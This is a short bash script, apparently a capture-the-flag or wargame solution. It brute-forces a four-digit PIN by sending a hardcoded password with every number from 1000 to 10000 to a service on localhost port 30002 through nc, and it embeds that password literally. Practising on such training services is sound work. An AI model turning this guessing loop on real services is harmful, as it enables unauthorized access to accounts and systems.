#!/bin/bash
pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
rm output
for i in {1000..10000..1}
do
        echo "$pass $i" >> output 
done

cat output | nc localhost 30002